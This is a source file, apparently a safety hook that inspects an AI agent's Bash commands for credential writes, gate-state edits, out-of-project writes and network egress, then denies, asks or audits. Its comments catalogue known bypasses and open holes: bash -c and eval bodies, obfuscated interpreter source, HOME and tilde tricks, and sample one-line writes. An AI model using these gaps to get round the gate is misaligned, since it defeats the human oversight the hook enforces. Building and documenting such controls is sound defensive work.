        # a different mechanism (an operator with its own semantics), so they fall through
        # and stay literal rather than being half-understood.
        if ch == "$":
            name = ""
            step = 0
            if tok.startswith("${", i):
                close = tok.find("}", i + 2)
                if close != -1 and PARAM_NAME.fullmatch(tok[i + 2:close]):
                    name = tok[i + 2:close]
                    step = close + 1 - i
            else:
                m = PARAM_NAME.match(tok, i + 1)
                if m:
                    name = m.group(0)
                    step = m.end() - i
            if name:
                val = os.environ.get(name)
                if val is None:
                    # Left LITERAL so the confirmation can quote the spelling back, and
                    # RECORDED so the row below is `unknown` rather than an affirmative
                    # in-project claim about <cwd>/$NAME/x, a path nothing writes to. An
                    # unset name expands to NOTHING in a real shell, so the write really
                    # lands at /x, the filesystem root.
                    unresolved = unresolved or name
                    out.append(tok[i:i + step])
                else:
                    out.append(val)
                i += step
                continue

        # Tilde, only outside quotes and only at an offset the shape rule above admits.
        # The tilde-prefix runs to the first `/` or to the end of the word.
        if ch == "~" and quote == "" and i in tilde_at:
            j = i + 1
            while j < len(tok) and tok[j] != "/":
                j += 1
            name = tok[i + 1:j]
            val = None
            if not name:
                # HOME first, the password database second, which is the same order and
                # the same fallback bash uses, so `~/x` still resolves with HOME unset.
                #
                # `val is None`, NOT `not val`: HOME PRESENT BUT EMPTY is a third state,
                # and bash uses the empty value rather than falling back. Measured:
                # `env -i HOME= bash -c 'printf %s ~/x'` prints `/x`, while with HOME
                # genuinely unset the same command prints the password-database home. The
                # falsiness test conflated them, and where a project root IS the invoking
                # user's home the passwd answer reads as IN-PROJECT for a write the shell
                # sends to the filesystem root, which is the bypass class this whole block
                # exists to close. The parameter-expansion branch below already tests
                # `is None` for the same reason.
                val = os.environ.get("HOME")
                if val is None and pwd is not None:
                    try:
                        val = pwd.getpwuid(os.getuid()).pw_dir
                    except Exception:
                        val = None
            elif pwd is not None and LOGIN_NAME.fullmatch(name):
                # The charset admits a DOT and must: `~lucio.saldivar/x` is one of the
                # measured bypasses, and a naive [A-Za-z0-9_] identifier leaves exactly
                # that spelling open. It must NOT admit a leading `+`, `-` or digit,
                # because those are the three directory-stack forms (`~+`, `~-`, `~N`),
                # disclosed residue in each caller's own unexpanded-forms header block,
                # kept literal BY THIS RULE rather than by getpwnam happening to fail on
                # them.
                try:
                    val = pwd.getpwnam(name).pw_dir
                except Exception:
                    # An unknown login name stays LITERAL, which is what bash does with it,
                    # so this is correct rather than merely conservative.
                    val = None
            # `val is not None`, NOT `if val`, for the same reason as the HOME lookup
            # above: a tilde that RESOLVED to the empty string still resolved, and bash
            # substitutes it (`HOME= ; ~/x` is `/x`). None is the only "did not resolve"
            # answer, and it is what an unknown login name and the three directory-stack
            # forms produce, so both still fall through and stay literal.
            if val is not None:
                out.append(val)
                i = j
                continue

        out.append(ch)
        i += 1

    return "".join(out), unresolved
# EXPAND END expand_word
# THE PACKAGE COPY IS THE ONE THAT RUNS whenever the import resolves, the same
# pattern and the same reason as the MIRROR block above: the inline copy exists so a
# failed import degrades to identical behavior rather than silently back to the
# defect. hooks/scripts/writ-worktree-safety.sh carries this same block.
try:
    from writ.session.bash_expand import expand_word   # noqa: F811
except Exception:
    pass


def redir_target(tok, nxt):
    """The file a redirect token writes to, or None (not a redirect / fd-dup /
    process substitution). Assumes posix=False tokens, so a quoted '>' (which keeps
    its leading quote char) never matches REDIR."""
    m = REDIR.match(tok)
    if not m:
        return None
    rest = tok[m.end():]
    if rest.startswith("|"):       # >| clobber-override: target follows
        rest = rest[1:]
    if rest.startswith("&"):       # fd dup: >&1, 2>&1
        return None
    if rest.startswith("("):       # process substitution: >(cmd)
        return None
    if rest:                       # glued: >file, 2>file
        return rest
    if nxt is not None and not nxt.startswith(("&", "(")):  # spaced: > file
        return nxt
    return None


# ── Third write vector: inline-code interpreters ────────────────────────────
# `python3 -c "open('src/x.py','w').write('evil')"` matches NONE of the vectors above
# -- no >, no tee, no cp -- so it used to yield no target, reach no gate and leave no
# audit row, while `echo x > src/x.py` was denied. An audit reproduced that live: the
# "no code before plan approval" boundary fell to one line, silently.
#
# THE QUESTION ASKED IS DELIBERATELY NOT "does this code write?". Deciding that from
# interpreter source is a parser arms race nobody wins. This asks the same
# mechanism-agnostic question the gate-state guard at the top of the hook already
# asks: does the command TEXT name a file? A segment that runs inline code has its
# arguments scanned for path-shaped STRING LITERALS (plus bare path arguments -- see
# token_literals), and every hit goes into raw_targets, so the existing classification
# (credential / gate state / project-local) and the existing work-gate call and audit
# row apply unchanged. Nothing downstream of raw_targets knows this vector exists.
#
# FALSE POSITIVES ARE THE ACCEPTED COST. `python3 -c "print(open('src/x.py').read())"`
# is read-only and will be gated. That is the same trade the gate-state guard makes,
# and the alternative -- silence on a write -- is the defect being closed here.
#
# COVERED: python / python3 / pythonX.Y `-c`, node / nodejs `-e` `--eval` `-p`
# `--print`, perl `-e` `-E` (including the glued `-pi -e` in-place form), ruby `-e`,
# php `-r`; each flag glued to its code (`-c'...'`); a leading `\`, NAME=value
# assignments and the sudo/env/command wrappers, because verb_at resolves the verb.
# Also the STDIN forms -- a bare `-`, a heredoc (`<<'PY'`, whose OPENER TOKEN is deliberately
# kept by strip_heredoc_bodies, because it is the only marker of this spelling and the
# 1.7.0 stripper dropped it), an input redirect (`python3 < script.py`) and an ARGUMENT-FREE
# interpreter fed by a pipe (`printf '...' | python3`, which runs its stdin with no marker on
# the command) -- for which the WHOLE command text is scanned instead (the UNSTRIPPED token
# stream: a heredoc body is exactly where this vector's source lives), since the source
# arrives from another segment or from a heredoc body that is not an argument.
# NOT COVERED, knowingly: `python -m MODULE` (module execution, not inline code -- a
# module that itself writes, like py_compile, is not seen; the check bails there
# because everything after `-m` is the module's own arguments, `-c`/`-p` included);
# awk/sed program text; an
# interpreter reached through a variable, an alias or a wrapper script; a path built
# by concatenation or held in a variable (`open(P,'w')`); base64/eval-obfuscated
# source; and a path whose basename carries no recognized extension and no `/`, `./`
# or `~/` sigil (`open('scratch','w')`).
#
# `sh -c` / `bash -c` / `eval` ALSO NOT COVERED, and the reason stated here used to be
# FALSE. It said their body is shell, "already parsed by the vectors above". It is not.
# MEASURED through this extractor with WRIT_CWD=/proj:
#
#   bash -c "echo x > src/y.py"      -> set()
#   bash -c "cp seed.txt src/y.py"   -> set()
#   bash -c "echo x | tee src/y.py"  -> set()
#   sh -c "echo x > src/y.py"        -> set()
#   bash -c 'echo x > src/y.py'      -> set()
#   bash -c echo x > src/y.py        -> local /proj/src/y.py   (UNQUOTED ONLY)
#
# In every quoted spelling the body is ONE token, and a token beginning with a quote
# character never matches REDIR, so nothing in it is parsed by any vector. Only the
# unquoted spelling, which nobody writes, is seen, and it is seen because at that point
# the redirect belongs to the OUTER command.
#
# The REAL reason these three stay open is the FALSE-POSITIVE COST: gating every
# `bash -c` would gate most tooling, and this gate's posture is to narrow a hole rather
# than to prompt on every shell invocation. Their behavior is deliberately UNCHANGED by
# cycle P; only this reason changed. A disclosure that misstates WHY a hole is open is
# worse than one that admits it, because it stops the next reader re-examining it, and
# that is exactly what happened: the wrong reason survived long enough to be quoted in
# three other documents as a bare list item.
INLINE_INTERPRETERS = frozenset({"python", "node", "nodejs", "perl", "ruby", "php"})
INLINE_CODE_FLAGS = frozenset({"-c", "-e", "-E", "-r", "-p", "--eval", "--print"})
INLINE_GLUED_FLAGS = ("-c", "-e", "-E", "-r", "-p")
MODULE_FLAGS = ("-m",)
# Extensions that let a token with no path sigil count as a file. DELIBERATELY NOT
# imported from writ.session.gates._CODE_EXTENSIONS: this block has to keep working on
# the package-import fallback path above -- where that import is precisely what failed
# -- and an empty extension list there would silently reopen the hole this closes
# (same posture as allow_hosts: a missed import must never OPEN the gate). Broader
# than "code" on purpose, because the work gate covers every project file.
INLINE_FILE_EXTS = frozenset({
    ".py", ".pyi", ".pyx", ".js", ".jsx", ".mjs", ".cjs", ".ts", ".tsx", ".php", ".go",
    ".rs", ".java", ".rb", ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".cs", ".swift",
    ".kt", ".kts", ".scala", ".m", ".mm", ".sql", ".sh", ".bash", ".zsh", ".pl", ".pm",
    ".lua", ".ex", ".exs", ".clj", ".vue", ".svelte", ".r", ".jl", ".tf",
    ".json", ".jsonl", ".ndjson", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf",
    ".properties", ".xml", ".html", ".htm", ".css", ".scss", ".less", ".md", ".rst",
    ".txt", ".csv", ".tsv", ".lock", ".log", ".cypher", ".proto", ".graphql",
    ".patch", ".diff", ".bin", ".dat", ".db", ".sqlite", ".pickle", ".pkl", ".npy",
})
# `python3.12` -> `python`, `php8` -> `php`. Trailing dots go with the digits so a
# version never leaves a stray separator behind.
VERSION_SUFFIX = re.compile(r"[0-9.]+$")
# Path-shaped runs inside one string literal or one bare argument. Quotes, parens,
# commas and colons are not path characters, so they act as delimiters.
PATH_CAND = re.compile(r"[A-Za-z0-9_@+~./-]+")
# One string literal, single- or double-quoted. In every language covered here a path
# in source code IS a string literal, which is the discriminator this scan rests on.
QUOTED = re.compile(r"'([^']*)'|\"([^\"]*)\"")
# Characters that mean a token is CODE rather than a filename. A real path argument
# does not contain them; `console.log(process.env)` does.
CODE_PUNCT = "()[]{};,"


def interpreter_name(verb):
    """The interpreter family of a verb_at() verb (already basenamed and unbackslashed)."""
    return VERSION_SUFFIX.sub("", (verb or "").lower())


def inline_form(args):
    """"flag" (source in an argument), "stdin" (source piped/heredoc'd/redirected in),
    or "" (not an inline-code invocation). First marker in argument order wins."""
    for a in args:
        d = dequote(a)
        if not d or d == "--":
            continue
        if d == "-" or (d.startswith("<") and not d.startswith("<(")):
            return "stdin"
        if not d.startswith("-"):
            continue
        base = d.split("=", 1)[0]
        if base in INLINE_CODE_FLAGS:
            return "flag"
        short = not d.startswith("--") and len(d) > 2
        if short and d[:2] in INLINE_GLUED_FLAGS:
            return "flag"
        if base in MODULE_FLAGS or (short and d[:2] in MODULE_FLAGS):
            return ""
    return ""


def looks_like_path(c):
    """True for a candidate that names a file. Applied to the contents of a string
    literal or a bare argument (token_literals decides which), so what it rejects is
    the ordinary content of one: `src/x.py` and `./x` qualify, while `w`, `utf-8`,
    `hello world`, `1/2` and `--flag` do not."""
    if not c or c in NONFILE or c.startswith(("-", "//")):
        return False
    c = c.rstrip("/") or "/"
    # Credential shapes FIRST, through the same single-source classifier the targets
    # are later classified with. Without it `.env` (no extension after splitext) and
    # `deploy.pem` (a credential extension, deliberately absent from the file-extension
    # set below) would be candidates that never became targets -- the credential deny
    # would have applied to `echo k > deploy.pem` and not to `python3 -c
    # "open('deploy.pem','w')"`, which is the exact asymmetry this vector exists to end.
    if is_cred(c):
        return True
    if os.path.splitext(os.path.basename(c))[1].lower() in INLINE_FILE_EXTS:
        return True
    # An explicit sigil is evidence on its own, extension or not.
    if c.startswith(("/", "./", "../", "~/")):
        return bool(c.strip("./~"))
    # A dotfile with no sigil and no extension (`.gitignore`) is a KNOWN miss: the
    # general rule that would catch it -- "basename starts with a dot" -- also catches
    # `.write` and `.read` out of `f.write(...)`, and denying every one-liner that calls
    # a method is not a trade worth making. Credential dotfiles are covered above.
    return False


def token_literals(tok):
    """The path-bearing text a token contributes: its STRING LITERALS, or the token
    itself when it is a bare command-line argument.

    This is what keeps the scan usable. Scanning interpreter source as flat text made
    every attribute chain a candidate -- `console.log` read as a .log file and
    `process.env` as a credential -- so `node -e "console.log(process.env)"`, which
    names no file at all, was refused. In each covered language a path in source IS a
    quoted literal, and an attribute chain never is, so only literals are scanned.

    Three shapes, in order: one layer of SHELL quoting is dropped first (`-c "..."`);
    what remains is code, and its quoted spans are the literals; a token with no
    literals is a bare argument (`perl -pi -e s/a/b/ src/a.pl`, `python3 <
    scripts/build.py`) unless it carries code punctuation, in which case it is code
    that mentions no file.

    KNOWN MISS, stated rather than discovered later: a literal nested one level deeper
    (`python3 -c "os.system('cat > src/a.py')"`) is read as the inner literal only, and
    a path assembled from pieces or held in a variable has no literal to find at all.
    """
    if len(tok) >= 2 and tok[0] == tok[-1] and tok[0] in ("'", '"'):
        tok = tok[1:-1]
    spans = [m.group(1) if m.group(1) is not None else m.group(2)
             for m in QUOTED.finditer(tok)]
    if spans:
        return spans
    if any(ch in tok for ch in CODE_PUNCT):
        return []
    return [tok]


def scan_tokens(toks):
    """Project-path candidates carried by these tokens.

    A literal containing ANY BRACE CHARACTER is skipped whole, which is wider than the
    templates that motivated it and is meant to be: PATH_CAND excludes braces,
    so scanning an f-string like `check('<brace>d<brace>/elsewhere/pkg')` drops the
    placeholder and yields the run `/elsewhere/pkg`: an absolute path nobody named. The
    phantom was harmless while an out-of-repo target produced no row, and became a
    REFUSAL the moment this gate started work-gating those. CODE_PUNCT already names the
    braces as "this token is code, not a filename"; token_literals applies that test only
    to a BARE token, never to the spans it pulls out of quotes, which is the gap.

    Skipping cannot hide a real write, and the width is why. A brace-bearing literal was
    NEVER captured as itself even before this change, template or not: PATH_CAND split it
    at the brace and emitted a fragment, so the choice here is between a wrong path and no
    path, never between a right path and none. For a template the resolved target is not
    the text on the line at all, which is the same already-documented limit as a path
    assembled from pieces or held in a variable. A static filename that merely contains a
    brace loses a fragment nobody could have gated correctly anyway.
    """
    out = []
    for tok in toks:
        for lit in token_literals(tok):
            if "{" in lit or "}" in lit:
                continue
            out += [c for c in PATH_CAND.findall(lit) if looks_like_path(c)]
    return out

# THREE STREAMS, and the split between them IS the design.
#   raw_tokens  the pre-split stream, heredoc bodies INCLUDED.
#   tokens      bodies STRIPPED. Segmentation and every per-segment pass read this, so a
#               document ABOUT a write is not judged as the write.
#   the stdin-interpreter scan below reads the UNSTRIPPED stream, on purpose; see there.
# STRIPPING BEFORE SPLITTING matches writ-worktree-safety.sh's ordering and the ADR's
# stated reason: a body line must never be re-split, so it can never contribute a segment.
try:
    pre = split_commands(cmd)
    raw_tokens = rejoin_glued_words(pre, shlex.split(pre, comments=False, posix=False))
except ValueError:
    # THE SENTINEL PRINTS BEFORE THIS EXIT, because this is a COMPLETED decision and not
    # a fault: unbalanced quotes are a deliberate fail-open ("no false deny"). Without the
    # print, every quote-unbalanced command would reach the consumer with no sentinel, be
    # read as a decider fault, and ASK, which is a real usability regression rather than a
    # safety gain. Pinned as a capability in its own right.
    print(STATUS_COMPLETE)
    sys.exit(0)   # unbalanced quotes etc -> fail open (no false deny)
# posix=False forces whitespace_split, so `> a.txt; bar` leaves `a.txt;` ONE token: the
# target reads as `a.txt;` and the `;` never splits a segment. Re-split here, once, so
# the redirect loop, the cmd0 write arms, the interpreter scan and the egress pass all
# see the same corrected stream. Values and segmentation are the same defect from two
# ends, so they are fixed in one place rather than per consumer.
tokens = split_control_operators(strip_heredoc_bodies(raw_tokens))

# Segment on control operators so each command's dest logic is scoped. Each segment
# carries one extra bit -- whether the control token BEFORE it was a pipe -- which the
# egress pass needs to know that local data feeds the segment. Write extraction below
# unpacks the pair and is otherwise untouched.
#
# A BARE group closer never enters a segment: a fully spaced subshell puts the `)` on its
# OWN token, and a bare `)` is a valid positional argument to every write arm below (the
# cp/mv/install destination is `cand[-1]`, the sed -i file is `files[-1]`, and the tee
# loop takes any non-flag argument), so it would both invent a phantom target AND lose the
# real one. MEASURED before this cycle, when nothing yet stepped over the opener:
# `( echo x | tee src/y.py )` already emitted the phantom row ('local', '/proj/)') beside
# the real target. Dropped HERE, as syntax, rather than normalized with the values below,
# because the bare token IS the closer: stripping it would yield "", a NONFILE member, and
# would delete rows instead of correcting them. `]`, `]]` and `))` are NOT dropped -- the
# loops below COUNT them to suppress redirects inside a comparison or arithmetic span.
segments, cur, piped = [], [], False
for t in tokens:
    if t in CONTROL:
        if cur:
            segments.append((cur, piped))
        cur = []
        piped = t == "|"
    elif t in GROUP_CLOSER_TOKENS:
        continue
    else:
        cur.append(t)
if cur:
    segments.append((cur, piped))

# Nested commands, spliced in as ADDITIONAL segments BEFORE any pass runs, so the write
# loop resolves cmd0 for them and the egress loop resolves the verb, with no new arm on
# either side. The original segment stays in the list: its cmd0 is `find`, it matches no
# arm, and its redirect scan keeps working, so `find ... -exec ... \; > log` still gates
# log. The list is SNAPSHOTTED first, so a spliced span is never itself rescanned: one
# level is every level find has, and re-entering would be unbounded for no coverage. The
# piped flag is FALSE for every span, because what feeds find's stdin does not feed the
# command find execs, and the egress pass reads that bit as "local data feeds this
# segment".
for _seg, _piped in list(segments):
    for _span in nested_command_spans(_seg):
        segments.append((_span, False))

raw_targets = []
for seg, _piped_in in segments:
    if not seg:
        continue
    # 1. redirects -- suppressed inside [[ ]] / [ ] / test / (( )) comparison+arith spans.
    arith = 0
    test_ctx = 0
    # NOT seg[0]: `FOO=1 tee f` / `env FOO=1 cp a b` / `sudo cp a b` write too.
    cmd0, cmd_arg0, _assigns = verb_at(seg)
    seg_is_test = cmd0 in ("[", "[[", "test")
    skip_next = False
    for i, tok in enumerate(seg):
        quoted = tok[:1] in ("'", '"')
        if not quoted:
            o, c = tok.count("(("), tok.count("))")
            if o or c:
                arith = max(0, arith + o - c)
                continue
            if tok in ("[[", "["):
                test_ctx += 1; continue
            if tok in ("]]", "]"):
                test_ctx = max(0, test_ctx - 1); continue
        if skip_next:
            skip_next = False; continue
        if arith > 0 or test_ctx > 0 or seg_is_test:
            continue
        nxt = seg[i + 1] if i + 1 < len(seg) else None
        tgt = redir_target(tok, nxt)
        if tgt is not None:
            raw_targets.append(expand_word(tgt))
            if tgt == nxt:
                skip_next = True
    # 2. command-specific write destinations (skip pure test/arith commands).
    if seg_is_test:
        continue
    # expand_word, NOT dequote, and on the RAW token: this is the collection point, the
    # last place quoting still exists. `pairs` carries (value, unresolved) per argument;
    # `args` is the values alone, because every shape test below (a leading `-`, an `of=`
    # prefix, a REDIR match) asks about the VALUE and the four arms are otherwise unchanged.
    # A pair is appended to raw_targets only for the argument that really is the write
    # destination, so an unresolved variable in a SOURCE argument raises no confirmation.
    pairs = [expand_word(a) for a in seg[cmd_arg0:]]
    args = [v for v, _unres in pairs]
    if cmd0 == "tee":
        for j, a in enumerate(args):
            if a.startswith("-"):
                continue
            if a.startswith(("<", ">")) or REDIR.match(a):  # redirect / process-sub ends the list
                break
            raw_targets.append(pairs[j])
    elif cmd0 == "dd":
        # The `of=` prefix is sliced off the EXPANDED word, which is what makes the
        # assignment-position tilde a real shell expands there reach classification as the
        # home directory it resolves to instead of as a relative path under cwd.
        raw_targets += [(v[3:], u) for v, u in pairs if v.startswith("of=") and v[3:]]
    elif cmd0 in ("cp", "mv", "install"):
        tdir = None
        skip = False
        for j, a in enumerate(args):
            if skip:
                skip = False; continue
            if a in ("-t", "--target-directory"):
                if j + 1 < len(args):
                    tdir = pairs[j + 1]; skip = True
            elif a.startswith("--target-directory="):
                tdir = (a.split("=", 1)[1], pairs[j][1])
            elif a.startswith("-t") and len(a) > 2:
                tdir = (a[2:], pairs[j][1])
        if tdir is not None:
            raw_targets.append(tdir)        # -t DIR: the dir IS the write dest
        else:
            cand = [pairs[j] for j, a in enumerate(args)
                    if not a.startswith("-") and REDIR.match(a) is None]
            if len(cand) >= 2:              # last positional is the destination
                raw_targets.append(cand[-1])
    elif cmd0 == "sed":
        if any(a == "-i" or a.startswith("-i") or a == "--in-place" or a.startswith("--in-place") for a in args):
            files = [pairs[j] for j, a in enumerate(args)
                     if not a.startswith("-") and REDIR.match(a) is None]
            if files:                       # the edited file is the LAST positional (skip the script)
                raw_targets.append(files[-1])

# Inline-interpreter pass: same segments, third question -- does this command hand an
# interpreter source code that NAMES a project file? Its hits join raw_targets, so
# every path below is classified and gated identically whether it came from a redirect
# or from `python3 -c`. Runs on the RAW segment tokens: shlex(posix=False) keeps the
# quote characters, and PATH_CAND excludes them, so quotes act as delimiters.
stdin_interpreter = False
# Interpreter-scanned hits are tracked separately because ONE rule applies to
# them alone: an EXISTING DIRECTORY named in interpreter arguments is never a
# file-write target (no language here can open() a directory for writing), so
# gating it is pure false positive -- observed live when a read-only
# `python -c "validate('<project root>')"` probe was denied as a write to the
# repo root via the `ap == cwd` branch below. The skip must NOT apply to the
# shell vectors that share raw_targets: `cp/mv -t DIR` writes INTO a directory
# and stays gated. A NONEXISTENT path stays gated on this vector too -- it
# could be a file about to be created.
interp_hits = set()
for seg, piped_in in segments:
    if not seg:
        continue
    verb, arg0, _assigns = verb_at(seg)
    if interpreter_name(verb) not in INLINE_INTERPRETERS:
        continue
    args = seg[arg0:]
    form = inline_form(args)
    if not form and piped_in and not args:
        # `printf '...' | python3` -- an argument-free interpreter reading a pipe runs
        # the program on its stdin exactly as `python3 -` does, with no marker on the
        # command at all. The pipe IS the marker.
        form = "stdin"
    if form == "flag":
        hits = scan_tokens(args)
        # NOT expanded, and that is the correct answer rather than an omission: a tilde
        # inside a source-code string literal is expanded by NEITHER the shell (it sits
        # inside the interpreter's own quoted argument) nor the interpreter, so the write
        # really does land under cwd and the existing join already says so.
        raw_targets += [(h, "") for h in hits]
        interp_hits.update(hits)
    elif form == "stdin":
        stdin_interpreter = True
if stdin_interpreter:
    # The source is not in this segment's arguments: it arrives over a pipe, from a
    # heredoc body, or from an input redirect. Every token of the command is the only
    # place it can be, so paths named by ANY segment count -- `cat notes.md | python3 -`
    # is gated on notes.md. Coarser than the flag form, deliberately: a stdin-fed
    # interpreter is itself the strong signal, and the answer to "the code is somewhere
    # in here" must not be silence.
    #
    # THE UNSTRIPPED STREAM, and that is a design decision with EXECUTED evidence behind
    # it rather than an implementation detail. A heredoc body is exactly where this
    # pass's source text lives, so the stripped stream would answer "nowhere": measured
    # on `python3 - <<'EOF'` over `open('src/x.py','w')`, the write is DETECTED today and
    # a stripped scan loses it. This pass is a whole-command bag-of-literals question by
    # design, so reading the pre-strip stream matches its own contract. Built HERE rather
    # than beside `tokens` so a command that is not a stdin-fed interpreter never pays
    # the extra pass.
    hits = scan_tokens(split_control_operators(raw_tokens))
    raw_targets += [(h, "") for h in hits]   # not expanded, for the reason on the arm above
    interp_hits.update(hits)

seen = set()
for raw, unresolved in raw_targets:
    # ONE normalization point for every write vector's collected targets: downstream of
    # ALL collection, upstream of ALL classification, so NONFILE, the credential
    # classifier, the gate-state check, the dedup and the abspath all see the same
    # corrected value. A group's trailing `)` or backtick used to survive into every one
    # of them, and it cost in BOTH directions: `(echo x > src/y.py)` yielded
    # `<cwd>/src/y.py)` (a secret spelled that way was a silent allow) and
    # `(echo x > /dev/null)` yielded the row `outside /dev/null)`, work-gating a
    # NONFILE target (ordinary work refused). Stripping punctuation per consumer is
    # exactly what the control-operator ADR rejected.
    t = strip_unbalanced_close(raw)
    if t in NONFILE or t in seen:
        continue
    seen.add(t)
    if is_cred(t):
        print(f"cred\t{t}")
        continue
    if is_gate_state(t):
        print(f"state\t{t}")
        continue
    # An expansion this hook could not resolve makes the apparent path stop being
    # evidence, so no `local`/`outside` row is emitted for it at all: there is no path to
    # feed the work gate, and printing one would be an affirmative in-project claim about
    # a path nothing writes to. Ordered AFTER the two arms above ON PURPOSE, so a
    # credential-shaped target still DENIES rather than merely asking (is_cred classifies
    # on basename, which survives an unresolved prefix intact).
    if unresolved:
        print(f"unknown\t{t}\t{unresolved}")
        continue
    ap = t if os.path.isabs(t) else os.path.normpath(os.path.join(cwd, t))
    # Interpreter-only exemption; see the interp_hits comment above.
    if t in interp_hits and os.path.isdir(ap):
        continue
    # Work-gate EVERY target. `local` and `outside` both reach the same can-write decision
    # below and differ only in what the row says. An out-of-repo target used to produce NO
    # ROW, so it reached no gate and left no audit line, which is what made the Write
    # tool's project boundary enforceable on one write door and not the other.
    if ap == cwd or ap.startswith(cwd + os.sep):
        print(f"local\t{ap}")
    else:
        print(f"outside\t{ap}")

# Egress pass: same tokens, same segments, second question -- does this command SEND
# local data to a host that is not allowlisted? A verb the tokenizer put in a quoted
# argument or a test span is never in command position, so quoted mentions and
# `[ "$a" = "gh gist create" ]` cannot produce a hit.
egress_seen = set()
for seg, piped_in in segments:
    if not seg:
        continue
    verb, arg0, assigns = verb_at(seg)
    if verb not in EGRESS_VERBS:
        continue
    args, fed_redir = strip_redirs(seg[arg0:])
    fed = piped_in or fed_redir
    # A leading `http_proxy=...` assignment redirects the transfer as thoroughly as
    # --proxy does, and it is on THIS command only, so it belongs to this segment.
    proxy_assign = next(
        (a for a in assigns if a.split("=", 1)[0].lower() in PROXY_ASSIGN_NAMES), "")
    if verb in ("curl", "wget"):
        hits = egress_http(verb, args, fed, proxy_assign)
    elif verb in ("scp", "rsync"):
        hits = egress_copy(verb, args)
    elif verb == "sftp":
        hits = egress_sftp(args)
    elif verb == "gh":
        hits = egress_gh(args)
    else:
        hits = egress_socket(verb, args, fed)
    for host, detail, force in hits:
        if not force and is_allowed_host(host):
            continue
        # An egress-shaped command whose destination cannot be named still asks. The
        # field is never emitted EMPTY: tab is IFS whitespace, so bash's `read` would
        # collapse an empty middle field and the row would silently vanish.
        row = (flat(host) or "(destination host could not be resolved)", flat(detail))
        if row in egress_seen:
            continue
        egress_seen.add(row)
        print(f"egress\t{row[0]}\t{row[1]}")

# LAST LINE, unconditionally: the block ran to completion. Every earlier exit prints it
# too (there is one, the unbalanced-quotes fail-open above). An exception anywhere in
# between reaches here through no path at all, which is exactly the signal the consumer
# needs.
print(STATUS_COMPLETE)
PY
)

# THREE OUTCOMES, NOT TWO. `[ -z "$TARGETS" ] && exit 0` was the consumer half of the
# defect above: it read "the extractor did not run" and "the extractor ran and found
# nothing" as the same thing, and answered both with a silent allow.
#
#   last line is the sentinel, other lines present -> strip it and fall into the code
#     below unchanged, so every awk filter and the can-write loop see exactly what they
#     saw before this cycle.
#   the sentinel alone -> exit 0, silently, the hot path for almost every command.
#   no sentinel -> the block did not run to completion. Fault path: ask, and record it.
#
# STRIPPED HERE, ONCE, rather than asking six consumers to ignore a `status` row: five
# arms below key on the first TSV column and the can-write loop reads a two-field row
# positionally, so a leaked sentinel would invent an unresolved target (an ask on a
# command that has none) or a phantom write path. Strip once and none of them can be
# surprised. Command substitution already dropped the trailing newline, so the sentinel is
# the text after the last newline, or the whole value when it is the only line.
_TARGETS_LAST="${TARGETS##*$'\n'}"
if [ "$_TARGETS_LAST" != "$WRIT_EXTRACTOR_SENTINEL" ]; then
    writ_decider_fault "writ-bash-write-gate" "bash-write-extractor" \
        "the Bash write/egress extractor did not finish, so this command was not checked for credential writes, gate-state writes, out-of-project writes or data egress"
    exit 0
fi
TARGETS="${TARGETS%"$_TARGETS_LAST"}"
TARGETS="${TARGETS%$'\n'}"

[ -z "$TARGETS" ] && exit 0

# 1. Credential targets: deny in any mode, no server needed (org boundary).
CRED_HIT=$(printf '%s\n' "$TARGETS" | awk -F'\t' '$1=="cred"{print $2; exit}')
if [ -n "$CRED_HIT" ]; then
    # log_gate_decision, not just emit_deny. The gate-state arm eight lines below makes both
    # calls; this one made only the second, so the org's hardest write boundary was the one
    # refusal with no audit row. The asymmetry between two sibling arms was the evidence.
    CRED_REASON="[SEC-CREDENTIAL-WRITE] Refusing this Bash command: it writes to a credential/secret path ('$CRED_HIT'). Secret material must not be written or overwritten by the agent. Name non-secret templates .env.example / .env.sample / *.pub."
    log_gate_decision "bash-write" "deny" "$CRED_REASON" "$CRED_HIT"
    emit_deny "$CRED_REASON"
    exit 0
fi

# 1b. Writ gate state: deny in any mode. A gate the agent can edit is not a gate.
STATE_HIT=$(printf '%s\n' "$TARGETS" | awk -F'\t' '$1=="state"{print $2; exit}')
if [ -n "$STATE_HIT" ]; then
    STATE_REASON="[ENF-GATE-STATE] Refusing this Bash command: it writes to Writ gate state ('$STATE_HIT'). Mode, approvals and the manual-testing grant live there. A manual-testing bypass is minted only from the user's own words, so ask the user to reply \"manual testing approved\"."
    log_gate_decision "bash-write" "deny" "$STATE_REASON" "$STATE_HIT"
    emit_deny "$STATE_REASON"
    exit 0
fi

# 2. Write targets, in-repo and out: run the SAME write gate the Write tool uses.
SKILL_DIR="$WRIT_DIR"
while IFS=$'\t' read -r kind path; do
    case "$kind" in
        local|outside) ;;
        *) continue ;;
    esac
    [ -z "$path" ] && continue
    # This loop runs once PER PATH found in the Bash command, so each interpreter start
    # here is paid per path, not per command. jq builds the body with --arg (the path is
    # never spliced into the program text), python stays as the fallback arm.
    if [ -z "${WRIT_NO_JQ:-}" ] && command -v jq >/dev/null 2>&1; then
        BODY=$(jq -n -c --arg fp "$path" --arg sd "$SKILL_DIR" \
            '{tool_input:{file_path:$fp}, skill_dir:$sd}' 2>/dev/null) || continue
    else
        BODY=$(WRIT_AP="$path" WRIT_SD="$SKILL_DIR" python3 -c "
import os, json
print(json.dumps({'tool_input': {'file_path': os.environ['WRIT_AP']}, 'skill_dir': os.environ['WRIT_SD']}))" 2>/dev/null) || continue
    fi
    RESP=$(curl ${WRIT_CURL_TRANSPORT} -sf --connect-timeout 0.2 --max-time 1 \
        -X POST "${WRIT_SESSION_BASE}/session/${SESSION_ID}/can-write" \
        -H "Content-Type: application/json" -d "$BODY" 2>/dev/null) || true
    if [ -z "$RESP" ]; then
        # Daemon unreachable: fall back to the same local subprocess the Write
        # gate uses ({"decision": allow|deny} shape), so an outage does not
        # ungate Bash writes. Only a NO-ANSWER (fallback also failed) is left
        # to policy: fail open by default, fail closed under WRIT_STRICT=1.
        RESP=$(printf '%s' "$BODY" | _writ_session can-write "$SESSION_ID" --skill-dir "$SKILL_DIR" 2>/dev/null \
            | json_transform \
                '{can_write: ((.decision // "allow") != "deny"), reason: .reason}' \
                "{'can_write': d.get('decision','allow') != 'deny', 'reason': d.get('reason')}" \
            2>/dev/null) || true
    fi
    if [ -z "$RESP" ]; then
        if [ "${WRIT_STRICT:-}" = "1" ]; then
